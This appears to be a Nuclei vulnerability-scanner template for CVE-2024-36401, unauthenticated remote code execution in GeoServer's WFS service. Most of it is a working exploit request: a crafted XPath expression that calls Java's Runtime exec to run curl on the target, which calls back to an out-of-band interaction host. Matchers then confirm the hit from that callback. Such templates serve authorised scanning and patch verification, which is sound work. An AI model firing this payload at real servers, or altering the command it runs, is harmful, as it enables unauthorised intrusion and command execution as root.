id: CVE-2024-36401

info:
  name: GeoServer Unauthenticated RCE
  author: kaks3c
  severity: critical
  description: |
    GeoServer is an open-source software server written in Java that provides
    the ability to view, edit, and share geospatial data. In GeoServer versions
    < 2.23.6, >= 2.24.0, < 2.24.4 and >= 2.25.0, < 2.25.1, multiple OGC request
    parameters allow Remote Code Execution (RCE) by unauthenticated users
    through specially crafted input against a default GeoServer installation
    due to unsafely evaluating property names as XPath expressions. An attacker
    can abuse this by sending a POST request with a malicious xpath expression
    to execute arbitrary commands as root on the system.

http:
  - raw:
      - |
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

        <wfs:GetPropertyValue service='WFS' version='2.0.0'
          xmlns:topp='http://www.openplans.org/topp'
          xmlns:fes='http://www.opengis.net/fes/2.0'
          xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames="sf:archsites"/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "curl {{interactsh-url}}")</wfs:valueReference>
        </wfs:GetPropertyValue>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: word
        part: interactsh_request
        words:
          - "curl"
